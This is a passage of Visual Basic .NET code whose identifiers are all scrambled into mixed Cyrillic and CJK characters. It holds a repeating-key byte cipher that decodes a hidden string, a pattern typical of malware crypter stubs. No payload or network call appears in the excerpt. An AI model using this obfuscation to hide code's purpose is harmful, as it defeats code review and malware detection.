        Return gгШいえjо与Џ与予事あаaрみϐЌлώабḔлlа予и争.GetString(革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(gгШいえjо与Џ与予事あаaрみϐЌлώабḔлlа予и争.GetBytes(Data), gгШいえjо与Џ与予事あаaрみϐЌлώабḔлlа予и争.GetBytes(ЌӨбeөgббӨЊлくь骨aḈḔь亊лоЦpsうуЗ予Ḇе)))
    End Function

    Function 革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(ByVal 亊зқъоほおог革ḔЉώほえxЖxϐуд革л頂sЊpjあШ As Byte(), ByVal ЌӨбeөgббӨЊлくь骨aḈḔь亊лоЦpsうуЗ予Ḇе As Byte()) As Byte()
        For I As Integer = 0 To 亊зқъоほおог革ḔЉώほえxЖxϐуд革л頂sЊpjあШ.Length - 1
            亊зқъоほおог革ḔЉώほえxЖxϐуд革л頂sЊpjあШ(I) = Ϛс革тkzлдЊяоьЦФfほd四はẦЖほЖ頂gaḔいЏϐ(亊зқъоほおог革ḔЉώほえxЖxϐуд革л頂sЊpjあШ(I), ЌӨбeөgббӨЊлくь骨aḈḔь亊лоЦpsうуЗ予Ḇе(бnӧきааjtЦϚかcsezskлふ難Ҙ予ьい予ЏьẦvь(I, ЌӨбeөgббӨЊлくь骨aḈḔь亊лоЦpsうуЗ予Ḇе.Length)))
        Next
        Return 亊зқъоほおог革ḔЉώほえxЖxϐуд革л頂sЊpjあШ
    End Function
End Module
